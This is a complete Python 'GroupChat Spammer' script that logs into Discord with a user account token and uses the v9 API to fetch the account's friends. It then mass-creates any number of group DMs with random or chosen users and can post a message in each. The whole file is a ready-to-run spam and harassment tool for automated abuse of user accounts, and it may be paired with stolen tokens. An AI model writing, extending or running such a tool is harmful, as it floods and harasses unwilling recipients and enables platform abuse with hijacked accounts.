import requests
import random
from colorama import Fore, Style, init

init()

def get_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

def fetch_friends(token):
    resp = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=get_headers(token))
    if resp.status_code == 200:
        return [u['id'] for u in resp.json() if u.get('type') == 1]
    return []

def create_group_dm(token, user_ids, message=None):
    payload = {
        "recipients": user_ids
    }
    resp = requests.post('https://discord.com/api/v9/users/@me/channels', headers=get_headers(token), json=payload)
    if resp.status_code == 200:
        channel_id = resp.json()['id']
        if message:
            requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=get_headers(token), json={"content": message})
        return True
    return False

def groupchat_spammer(token):
    print(f"{Fore.CYAN}=== GroupChat Spammer ==={Style.RESET_ALL}")
    friends = fetch_friends(token)
    if not friends:
        print(f"{Fore.RED}No friends found or failed to fetch friends!{Style.RESET_ALL}")
        return
    print(f"{Fore.CYAN}You have {len(friends)} friends.{Style.RESET_ALL}")
    mode = input(f"{Fore.CYAN}Choose mode ([1] Random friends, [2] Enter user IDs): {Style.RESET_ALL}").strip()
    if mode == '2':
        ids = input(f"{Fore.CYAN}Enter user IDs (comma separated): {Style.RESET_ALL}").strip()
        user_ids = [uid.strip() for uid in ids.split(',') if uid.strip()]
    else:
        count = input(f"{Fore.CYAN}How many users per group? (2-9): {Style.RESET_ALL}").strip()
        try:
            count = max(2, min(9, int(count)))
        except:
            count = 2
        user_ids = random.sample(friends, min(count, len(friends)))
    num_groups = input(f"{Fore.CYAN}How many group chats to create?: {Style.RESET_ALL}").strip()
    try:
        num_groups = max(1, int(num_groups))
    except:
        num_groups = 1
    message = input(f"{Fore.CYAN}Optional: Message to send in each group (leave blank for none): {Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Creating group chats...{Style.RESET_ALL}")
    success = 0
    for i in range(num_groups):
        if mode == '1':
            user_ids = random.sample(friends, min(count, len(friends)))
        ok = create_group_dm(token, user_ids, message if message else None)
        if ok:
            print(f"{Fore.GREEN}[{i+1}/{num_groups}] Group chat created!{Style.RESET_ALL}")
            success += 1
        else:
            print(f"{Fore.RED}[{i+1}/{num_groups}] Failed to create group chat!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Done! {success}/{num_groups} group chats created.{Style.RESET_ALL}")

if __name__ == "__main__":
    from token_info import prompt_token_input
    token = prompt_token_input()
    if token:
        groupchat_spammer(token) 